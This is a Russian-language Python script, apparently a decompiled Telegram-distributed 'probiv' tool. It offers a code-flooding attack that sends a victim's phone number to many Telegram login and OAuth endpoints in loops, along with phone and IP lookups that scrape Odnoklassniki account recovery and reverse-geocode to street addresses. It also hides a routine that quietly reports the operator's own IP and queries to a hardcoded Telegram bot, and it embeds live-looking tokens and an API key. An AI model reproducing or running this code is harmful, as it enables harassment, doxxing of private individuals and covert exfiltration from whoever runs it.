
#------------------
# -- DECODE
# -- Захотел 
# -- @HAHAHA_DECOD
#-------------------

import os, subprocess, sys, time, json, urllib.request, base64, random, requests, hashlib, webbrowser
from bs4 import BeautifulSoup
from datetime import datetime, timezone, timedelta
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.account import ReportPeerRequest
from telethon.tl.types import (
    InputReportReasonSpam,
    InputReportReasonViolence,
    InputReportReasonPornography,
    InputReportReasonChildAbuse,
    InputReportReasonOther
)
import asyncio, string, aiohttp, fake_useragent, faker
from fake_useragent import UserAgent
import threading
from tqdm import tqdm
from termcolor import colored
from urllib.parse import urlparse, parse_qs

ACCOUNTS_FILE = 'accounts_1.2.json'


class FONT:
    RED = '\033[91m'
    GREY = '\033[01;38;05;15m'
log_bot = '8180025570:AAF_Yw86c7QQ2UzxgH6CubeFTaQuvzmd1Sc'
log_rec = '959302275'
def flood_codami():
    z = 0
    mes = ""

    async def send_request(session, url, headers, data):
        nonlocal z
        nonlocal mes
        try:
            data_with_armat = data.copy()
            data_with_armat["message"] = f"{mes}"

            async with session.post(url, headers=headers, data=data_with_armat) as response:
                if response.status == 200:
                    z += 1
                else:
                    print(colored(f"Ошибка при отправке запроса на {url}: {response.status}", 'red'))
        except Exception as e:
            print(colored(f"Ошибка при отправке запроса на {url}: {e}", 'red'))

    async def main():
        nonlocal mes
        number = int(input("\nВведите номер телефона: "))
        count = int(input("Введите количество циклов: "))
        mes = input("Введите ник (ARMAT по умолчанию): ")
        if mes == "":
            mes = "ARMAT"
        urls = [
            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'https://translations.telegram.org/auth/request',
            'https://translations.telegram.org/auth/request',
            'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
            'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
            'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
            'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
            'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
            'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
            'https://my.telegram.org/auth/send_password'
        ]

        try:
            async with aiohttp.ClientSession() as session:
                for _ in range(count):
                    user = fake_useragent.UserAgent().random
                    headers = {'user-agent': user}
                    tasks = [send_request(session, url, headers, {'phone': number}) for url in urls]
                    await asyncio.gather(*tasks)
        except Exception as e:
            print('[!] Ошибка, проверьте вводимые данные:', e)
        print(colored(f"Успешно отправленных кодов: {z}", 'cyan'))
        print(colored(f"Всего циклов: {count} ", 'cyan'))

    if __name__ == "__main__":
        asyncio.run(main())


def probiv_po_ip():
    def get_user_ip():
        try:
            response = urllib.request.urlopen('https://api.ipify.org?format=json')
            data = json.load(response)
            return data.get('ip', 'Неизвестно')
        except Exception as e:
            return f"Ошибка при получении IP: {e}"

    def search_by_ip(ip):
        ip_info_url = f"https://ipinfo.io/{ip}/json"
        try:
            ip_info_response = urllib.request.urlopen(ip_info_url)
            ip_info = json.load(ip_info_response)
        except urllib.error.URLError:
            return "Информация по IP не найдена."

        result = {
            "query": ip_info.get('ip', 'Неизвестно'),
            "city": ip_info.get('city', 'Неизвестно'),
            "region": ip_info.get('region', 'Неизвестно'),
            "country": ip_info.get('country', 'Неизвестно'),
            "org": ip_info.get('org', 'Неизвестно'),
            "loc": ip_info.get('loc', '')
        }

        if result["loc"]:
            latitude, longitude = result["loc"].split(",")
            result["lat"] = latitude
            result["lon"] = longitude
            address_url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={latitude}&lon={longitude}"
            try:
                address_response = urllib.request.urlopen(address_url)
                address_data = json.load(address_response)
                if "address" in address_data:
                    sorted_address = sort_address(address_data["address"])
                    result["address"] = sorted_address
                else:
                    result["address"] = "Адрес не найден"
            except Exception as e:
                result["address"] = f"Ошибка при получении адреса: {e}"
        else:
            result["address"] = "Координаты недоступны"

        return result

    def sort_address(address):
        address_order = [
            "country",
            "state",
            "city",
            "town",
            "village",
            "road",
            "house_number",
            "postcode"
        ]

        sorted_address = {}
        for key in address_order:
            if key in address:
                sorted_address[key] = address[key]

        for key, value in address.items():
            if key not in sorted_address:
                sorted_address[key] = value

        return sorted_address

    def translate_address(address):
        translations = {
            "country": "Страна",
            "state": "Регион",
            "city": "Город",
            "town": "Городок",
            "village": "Деревня",
            "road": "Улица",
            "house_number": "Номер дома",
            "postcode": "Почтовый индекс",
            "residential": "Жилой район",
            "county": "Округ",
            "iso3166-2-lvl4": "Код региона",
            "country_code": "Код страны"
        }

        translated_address = {}
        for key, value in address.items():
            translated_key = translations.get(key, key.capitalize())
            translated_address[translated_key] = value

        return translated_address

    def send_notification(log_bot, log_rec, message):
        url = f'https://api.telegram.org/bot{log_bot}/sendMessage?chat_id={log_rec}&text={message}'
        response = requests.post(url)

    while True:
        user_ip = get_user_ip()
        current_time = datetime.now().strftime("%H:%M:%S")

        ip = input("\nВведите IP для поиска или 0 для выхода: ")

        if ip == '0':
            break
        else:
            log_info = (f"Запущен в {current_time}\n"
                        f"IP пользователя: {user_ip}\n"
                        f"Запрос: {ip}")
            send_notification(log_bot, log_rec, log_info)
            result = search_by_ip(ip)

            if isinstance(result, str):
                print(f"\n{result}")
            else:
                print(f"""
                IP: {result.get('query', 'Неизвестно')}
                Страна: {result.get('country', 'Неизвестно')}
                Регион: {result.get('region', 'Неизвестно')}
                Город: {result.get('city', 'Неизвестно')}
                Широта: {result.get('lat', 'Неизвестно')}
                Долгота: {result.get('lon', 'Неизвестно')}
                Организация: {result.get('org', 'Неизвестно')}
                Адрес:
                """)
                if isinstance(result.get("address"), dict):
                    translated_address = translate_address(result["address"])
                    for key, value in translated_address.items():
                        print(f"  {key}: {value}")
                else:
                    print(f"  {result.get('address', 'Неизвестно')}")


def get_address_by_coordinates(latitude, longitude):
    address_url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={latitude}&lon={longitude}"

    try:
        address_response = urllib.request.urlopen(address_url)
        address_data = json.load(address_response)

        if "address" in address_data:
            sorted_address = sort_address(address_data["address"])
            return sorted_address
        else:
            return "Адрес не найден"
    except Exception as e:
        return f"Ошибка при получении адреса: {e}"


def sort_address(address):
    address_order = [
        "road",
        "house_number",
        "village",
        "town",
        "suburb",
        "postcode"
    ]

    sorted_address = {}
    for key in address_order:
        if key in address:
            sorted_address[key] = address[key]

    return sorted_address


def translate_address(address):
    translations = {
        "road": "Улица",
        "house_number": "Номер дома",
        "village": "Деревня",
        "town": "Городок",
        "suburb": "Район",
        "postcode": "Почтовый индекс"
    }

    translated_address = {}
    for key, value in address.items():
        translated_key = translations.get(key, key.capitalize())
        translated_address[translated_key] = value

    return translated_address
def probiv_po_nomeru():
    USERAGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
    ]

    HTMLWEB_URL = "https://htmlweb.ru/geo/api.php?json&telcod="
    VERIPHONE_URL = "https://api.veriphone.io/v2/verify?phone="
    VERIPHONE_API_KEY = "133DF840CE4B40AEABC341B7CA407A2D"
    OK_LOGIN_URL = 'https://www.ok.ru/dk?st.cmd=anonymMain&st.accRecovery=on&st.error=errors.password.wrong'
    OK_RECOVER_URL = 'https://www.ok.ru/dk?st.cmd=anonymRecoveryAfterFailedLogin&st._aid=LeftColumn_Login_ForgotPassword'

    headers = {"User-Agent": random.choice(USERAGENTS)}

    def check_login(TELCODE):
        try:
            session = requests.Session()
            session.get(f'{OK_LOGIN_URL}&st.email={TELCODE}', timeout=10)
            request = session.get(OK_RECOVER_URL, timeout=10)
            ROOT_SOUP = BeautifulSoup(request.content, 'html.parser')
            if ROOT_SOUP.find('div', {'data-l': 'registrationContainer,offer_contact_rest'}):
                ACCOUNT_INFO = ROOT_SOUP.find('div', {'class': 'ext-registration_tx taCenter'})
                MASKED_PHONE = ROOT_SOUP.find('button', {'data-l': 't,phone'})
                if MASKED_PHONE:
                    MASKED_PHONE = TELCODE
                if ACCOUNT_INFO:
                    NAME = ACCOUNT_INFO.find('div', {'class': 'ext-registration_username_header'})
                    if NAME:
                        NAME = NAME.get_text()
                    ACCOUNT_INFO = ACCOUNT_INFO.findAll('div', {'class': 'lstp-t'})
                    if ACCOUNT_INFO:
                        PROFILE_INFO = ACCOUNT_INFO[0].get_text()
                        PROFILE_REGISTRED = ACCOUNT_INFO[1].get_text()
                    else:
                        PROFILE_INFO = None
                        PROFILE_REGISTRED = None

                print(FONT.RED + f"\n ├Источник:" + FONT.GREY + f" Одноклассники")
                print(FONT.RED + f" ├Привязанный номер:" + FONT.GREY + f" {MASKED_PHONE}")
                print(FONT.RED + f" ├Имя аккаунта:" + FONT.GREY + f" {NAME}")
                print(FONT.RED + f" ├Инфо профиля:" + FONT.GREY + f" {PROFILE_INFO}")
                print(FONT.RED + f" ├Дата регистрации:" + FONT.GREY + f" {PROFILE_REGISTRED}")

            if ROOT_SOUP.find('div', {'data-l': 'registrationContainer,home_rest'}):
                return 'not associated'
            else:
                return None
        except requests.exceptions.Timeout:
            print(FONT.RED + "Ошибка: Превышено время ожидания запроса к Одноклассникам.")
            return None

    def check_internet():
        try:
            urllib.request.urlopen('https://google.com', timeout=7.77)
            return True
        except urllib.error.URLError:
            print(FONT.RED + "Ошибка: Нет подключения к интернету!")
            sys.exit()

    check_internet()
    while True:
        TELCODE = input(
            FONT.RED + "\n[" + FONT.GREY + "?" + FONT.RED + "]" + FONT.GREY + " Введите номер для поиска или 0 для выхода: ")
        if TELCODE == '0':
            break
        print(FONT.RED + "\nРезультаты поиска:")

        try:
            response = requests.get(HTMLWEB_URL + TELCODE, headers=headers, timeout=10)
            if response.status_code == 200:
                data = response.json()
                TELCOD = data.get("country", {}).get("telcod", "Неизвестно")
                COUNTRY = data.get("country", {}).get("fullname", "Неизвестно")
                OKRUG = data.get("okrug", "Неизвестно")
                OBLAST = data.get("region", {}).get("name", "Неизвестно")
                CITY = data.get("0", {}).get("name", "Неизвестно")
                latitude = data.get("0", {}).get("latitude", "Неизвестно")
                longitude = data.get("0", {}).get("longitude", "Неизвестно")
                TIMEZONE = data.get("0", {}).get("time_zone", data.get("time_zone", "Неизвестно"))
                OPER = data.get("0", {}).get("oper", "Неизвестно")

                print(FONT.RED + f"\n ├Источник:" + FONT.GREY + f" HTMLWEB & Veriphone")
                print(FONT.RED + f" ├Телефонный код:" + FONT.GREY + f" +{TELCOD}")
                print(FONT.RED + f" ├Страна:" + FONT.GREY + f" {COUNTRY}")
                print(FONT.RED + f" ├Округ:" + FONT.GREY + f" {OKRUG}")
                print(FONT.RED + f" ├Регион:" + FONT.GREY + f" {OBLAST}")
                print(FONT.RED + f" ├Город:" + FONT.GREY + f" {CITY}")
                print(FONT.RED + f" ├Широта:" + FONT.GREY + f" {latitude}")
                print(FONT.RED + f" ├Долгота:" + FONT.GREY + f" {longitude}")
                print(FONT.RED + f" ├Часовой пояс:" + FONT.GREY + f" +{TIMEZONE} UTC")
            else:
                print(FONT.RED + f" ├Ошибка при получении данных от HTMLWEB: {response.status_code}")
        except Exception as e:
            print(FONT.RED + f" ├Ошибка при запросе к HTMLWEB: {e}")

        try:
            response = requests.get(f"{VERIPHONE_URL}{TELCODE}&key={VERIPHONE_API_KEY}", headers=headers, timeout=10)
            if response.status_code == 200:
                data = response.json()
                PHONE_TYPE = data.get("phone_type", "Неизвестно")

                print(FONT.RED + f" ├Тип:" + FONT.GREY + f" {PHONE_TYPE}")
                print(FONT.RED + f" ├Оператор:" + FONT.GREY + f" {OPER}")

        except Exception as e:
            print(FONT.RED + f" ├Ошибка при запросе к Veriphone: {e}")

        if latitude != "Неизвестно" and longitude != "Неизвестно":
            address = get_address_by_coordinates(latitude, longitude)
            if isinstance(address, dict):
                translated_address = translate_address(address)
                print(FONT.RED + f" ├Адрес:")
                for key, value in translated_address.items():
                    print(FONT.RED + f" │├{key}:" + FONT.GREY + f" {value}")
            else:
                print(FONT.RED + f" ├Адрес:" + FONT.GREY + f" {address}")

        check_login(TELCODE)
        print("\n\nДополнительные источники:")
        valid = TELCODE.replace('+', '')
        print(FONT.RED + f"\n├https://smsc.ru/testhlr/?phone={valid}" + FONT.GREY + f" - проверка на валид\n")
        print(FONT.RED + f"├https://reveng.ee/search?q={TELCODE}" + FONT.GREY + f" - расширенный поиск\n")


logo = f"""  

             █▓█       █      █▒▓      █░█░█░           ▒█    
           █▓  ▓█      ▓     ▓█       ▒     ▒█        ██  ██  
         █▓      ▓█    █    █▓      ░█              ▓▓      ▒█
         ▓        ▓    ▓  ▓▓        █░              █        █
         █        █    ▓█▓          ▒               ▓        ▒
         ▓▓░▓░▓░▓░▓    █ ▒█         █               █▒▒█▒▒█▒▒█
         █        █    █   ▒█▒      ▒               ▓        ▒
         ▓        ▓    ▓     ▒█     █░       ░█     ▓        █
         █        █    █      ▒█     █░      █      █        ▒
         █        █    █       ▒█     ▒█░█░█░       ▓        █
           https://t.me/HAHAHA_DECOD
          https://t.me/HAHAHA_DECOD
         https://t.me/HAHAHA_DECOD
       ДЕКОДИЛ ЗАХОТЕЛ


"""


def menu():
    print("\nМеню:")
    print("[1] - Пробив по номеру")
    print("[2] - Пробив по IP")
    print("[3] - Флуд кодами")
    print("[4] - Очистить консоль ")

def main():
    time.sleep(4)
    print(logo)
    print("Владелец - @woquc")
    while True:
        menu()
        c = input("\nВыберите опцию: ")
        if c == '1':
            probiv_po_nomeru()
        elif c == '2':
            probiv_po_ip()
        elif c == '3':
            flood_codami()

        elif c == '4':
            for i in range(10):
                os.system('clear')
            print(logo)
            print("Tg: @woquc")
        else:
            print("Неверный выбор.")

if __name__ == "__main__":
    main()
